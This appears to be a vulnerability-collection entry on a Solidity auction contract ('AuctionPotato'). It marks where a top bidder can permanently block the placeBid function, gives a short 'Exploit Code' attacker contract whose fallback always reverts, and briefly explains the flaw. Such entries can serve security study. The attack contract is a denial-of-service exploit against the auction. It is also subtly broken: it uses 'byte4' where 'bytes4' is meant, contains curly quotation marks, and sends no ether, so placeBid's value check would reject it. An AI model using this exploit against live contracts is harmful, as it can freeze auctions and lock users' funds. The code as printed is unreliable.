## Vulnerable Code

```javascript
contract AuctionPotato {
......
address public highestBidder;   //Vulnerable position_1
......
function placeBid() public
        payable
        onlyAfterStart
        onlyBeforeEnd
        onlyNotCanceled
        onlyNotOwner
        returns (bool success)
    {   
        // we are only allowing to increase in bidIncrements to make for true hot potato style
        require(msg.value == highestBindingBid.add(potato));
        require(msg.sender != highestBidder);
        require(now > startTime);
        require(blockerPay == false);
        blockerPay = true;
        
        // calculate the user's total bid based on the current amount they've sent to the contract
        // plus whatever has been sent with this transaction

        fundsByBidder[msg.sender] = fundsByBidder[msg.sender].add(highestBindingBid);
        fundsByBidder[highestBidder] = fundsByBidder[highestBidder].add(potato);

        highestBidder.transfer(fundsByBidder[highestBidder]);   //Vulnerable position_2
        fundsByBidder[highestBidder] = 0;
        
        oldHighestBindingBid = highestBindingBid;
        
        // set new highest bidder
        highestBidder = msg.sender;  //Vulnerable position_3
        highestBindingBid = highestBindingBid.add(potato);

        oldPotato = potato;
        potato = highestBindingBid.mul(4).div(9);
        
        emit LogBid(msg.sender, highestBidder, oldHighestBindingBid, highestBindingBid);
        blockerPay = false;
        return true;
    }
}
```



## Exploit Code

```javascript
contract Attack{
    address victimAddress;
    function setVictim(address  _victim){
        victimAddress = _victim;
    }

    function startAttack(){
        victimAddress.call(byte4(keccak256(“placeBid()”)));
    }

    function(){
        revert();
    }
}
```



##  Sophisticated Vulnerability Description
Let's look the comment of '//Vulnerable position_1', here it declare an global variable.then look at "//Vulnerable position_3", here the global variable is assignment with 'msg.sender'(possible is an malicious address).so look at '//Vulnerable position_2' here will always failed! 
